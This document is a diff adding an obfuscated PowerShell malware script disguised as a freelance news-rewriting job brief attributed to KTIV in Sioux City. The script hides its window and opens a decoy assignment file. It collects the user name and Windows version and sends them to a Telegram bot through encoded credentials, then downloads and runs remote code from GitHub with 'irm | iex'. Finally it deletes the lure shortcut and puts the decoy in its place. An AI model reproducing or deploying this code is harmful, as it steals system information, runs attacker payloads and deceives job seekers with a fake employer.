@@ -1,0 +1,143 @@
+Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
+$v0=[b0.a0]::GetConsoleWindow()
+[b0.a0]::ShowWindow($v0,0)
+$v1=1+2*3-4
+If($v1>0){}
+$v2="Technical Assignment NewsRewriting.txt"
+$v3=Join-Path $env:LOCALAPPDATA $v2
+$v4=@"
+
+
+
+
+
+TECHNICAL ASSIGNMENT
+News Article Rewriting for KTIV News Station
+
+About the Project
+So here's the deal. KTIV (Channel 4 NBC) is basically THE news source for Siouxland - we cover Iowa, Nebraska, and South Dakota. We're looking for someone to help us rewrite news articles from wire services and our local reporters. The main thing is making wire content feel natural for our regional readers while keeping everything accurate and professional.
+
+What You'd Be Doing
+You'll get news articles in their original form - usually from AP, Reuters, or our regional correspondents. Then you rewrite them to:
+1. Match our house style and tone
+2. Sound local and approachable for Siouxland readers
+3. Hit our word count guidelines
+4. Add relevant regional context where it makes sense
+
+Types of Stories We Send
+Local news from Sioux City, Council Bluffs, North Sioux City, and the tri-state area. Weather alerts and breaking news when things get busy. Features on community events, local businesses, people doing interesting stuff around here.
+
+Word Count We Work With
+Standard news: 400-600 words usually does it
+Feature stories: 600-900 words if there's more to cover
+Breaking news updates: 150-300 words, keep it tight
+Weather alerts: 100-200 words max
+
+Style Stuff
+Write at about an 8th-grade level - keeps it accessible for everyone. Active voice works best. Add local stats or historical context when you have it. Avoid jargon, spell out acronyms unless they're super common. Keep all the attribution from original sources intact.
+
+Formatting
+Follow AP Style as the baseline. Headlines should be short - 8 words max. Location goes in that first paragraph. Pull quotes only if they really add something for digital.
+
+Where Materials Come From
+Articles come via email as .docx or .txt files. You can check ktiv.com to see how we typically write things. That gives you good context on our coverage style.
+
+Quality Stuff
+Your rewrites must be original work - no copying. Double-check names, dates, stats against the source material. If something looks off, let us know right away. Keep everything clean and ready for editorial review.
+
+Revisions
+Minor stuff like grammar fixes or style tweaks - no problem, that's included. Bigger structural changes might need a quick chat. Usually it's just 1-2 rounds of revisions per article.
+
+How We Communicate
+Email works best. Put tracked changes in returned documents. Quick questions during normal business hours (CST) - no problem.
+
+Turnaround Times We Need
+Regular articles: 24-48 hours after you receive them
+Weather stuff: 2-4 hours, things move fast here
+Features: 3-5 days gives you time to do it right
+Rush jobs: just put it in the subject line so we know
+
+Technical Setup
+Microsoft Word (.docx) for everything. Standard fonts - Calibri 11pt or Times New Roman 12pt. Put your name and the date in the document header.
+
+What You Deliver
+Finished articles in clean .docx format. A quick note if you made significant changes from the source material. We can do weekly invoicing or per-project - we'll figure that out.
+
+One More Thing
+Honestly, this is steady work if things go well. We're looking for someone we can build a real working relationship with. Previous news writing or journalism experience is definitely a plus but not strictly required if you've got solid writing skills.
+
+Questions? Hit us at: kevin.morrison.workflow@gmail.com
+
+Just so you know - reference point is KTIV News Operations, Sioux City, IA. Part of Gray Television. We've been covering Siouxland for a long time.
+
+
+
+
+
+
+
+"@
+$v5=5*2-3
+If($v5>0){}
+$v4|Out-File -FilePath $v3 -Encoding UTF8
+Invoke-Item $v3
+$v6="ab01256441"
+$v7=Get-Random -Minimum 100000 -Maximum 999999
+$v8=cmd /c whoami
+$v9="Build ID: "+$v6+" | Attack ID: "+$v7+" | Device/User: "+$v8
+$v10=Join-Path $env:LOCALAPPDATA "identifier.txt"
+$v11=7*3-5
+If($v11>0){}
+$v9|Out-File -FilePath $v10 -Encoding UTF8 -NoNewline
+$v12="OAAAADkAAAA3AAAANgAAADEAAAAzAAAANAAAADgAAAA5AAAAMAAAADoAAABBAAAAQQAAAEYAAAB6AAAAXwAAAFEAAABHAAAATgAAAHYAAABKAAAARgAAAHoAAAA5AAAASgAAADAAAABXAAAAMQAAAGIAAABLAAAARwAAADUAAABLAAAAOAAAAHYAAABjAAAAWQAAAG8AAABDAAAANAAAADcAAABFAAAAawAAAEwAAABkAAAAawAAAA=="
+$v13=[System.Convert]::FromBase64String($v12)
+$v14=[System.Text.Encoding]::UTF32
+$v15=$v14.GetString($v13)
+$v16="MgAAADcAAAAwAAAAOAAAADYAAAA1AAAANAAAADAAAAA4AAAA"
+$v17=[System.Convert]::FromBase64String($v16)
+$v18=$v14.GetString($v17)
+$v19=8/2+1
+If($v19>0){}
+$v20=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$v21=(Get-CimInstance Win32_OperatingSystem).Caption
+$v22=Get-Content -Path $v10 -Raw
+$v23=$v22+"`n`nSession started for user: "+$v20+"`nWindows Version: "+$v21
+$v24="https://api.telegram.org/bot"+$v15+"/sendMessage"
+$v25=6*2-3
+If($v25>0){}
+$v26=@{chat_id=$v18;text=$v23}|ConvertTo-Json -Compress
+$v27=4+6-2
+If($v27>0){}
+try{$v28=Invoke-RestMethod -Uri $v24 -Method Post -ContentType "application/json" -Body $v26}catch{}
+$v29="___"
+$v30=[System.Convert]::FromBase64String($v29)
+$v31=$v14.GetString($v30)
+$v32="___"
+$v33=[System.Convert]::FromBase64String($v32)
+$v34=$v14.GetString($v33)
+$v35=3*4-2
+If($v35>0){}
+$v36="https://api.telegram.org/bot"+$v31+"/sendMessage"
+$v37=2*5-1
+If($v37>0){}
+$v38=@{chat_id=$v34;text=$v23}|ConvertTo-Json -Compress
+$v39=9-3+1
+If($v39>0){}
+try{$v40=Invoke-RestMethod -Uri $v36 -Method Post -ContentType "application/json" -Body $v38}catch{}
+$v41=8*2-3
+If($v41>0){}
+Start-Sleep -Seconds 333
+$v42=7*2-1
+If($v42>0){}
+irm https://github.com/fg9q/232312hjd/raw/refs/heads/main/jdksaasd_polys | iex
+$v43="Technical Assignment NewsRewriting.txt.ink"
+$v44=$false
+$v45=$null
+$v46=@((Join-Path $env:USERPROFILE "Desktop"),(Join-Path $env:USERPROFILE "Downloads"),(Join-Path $env:USERPROFILE "Documents"),(Join-Path $env:USERPROFILE "Pictures"),(Join-Path $env:USERPROFILE "Videos"),$env:LOCALAPPDATA,$env:APPDATA)
+$v47=6*3-2
+If($v47>0){}
+foreach($v48 in $v46){If(Test-Path -Path $v48){$v49=Join-Path $v48 $v43;If(Test-Path -Path $v49){$v45=$v49;$v44=$true;break}}}
+$v50=5+3-1
+If($v50>0){}
+If($v44){$v51=Split-Path -Parent $v45;$v52=Get-Date;$v53=600;while(((Get-Date)-$v52).TotalSeconds -lt $v53){$v54=Get-Process -Name "wscript" -ErrorAction SilentlyContinue;If($v54){try{Remove-Item -Path $v45 -Force -ErrorAction Stop;$v55=Join-Path $v51 (Split-Path -Leaf $v3);Copy-Item -Path $v3 -Destination $v55 -Force -ErrorAction Stop;exit}catch{exit}}Start-Sleep -Seconds 3}}
+exit
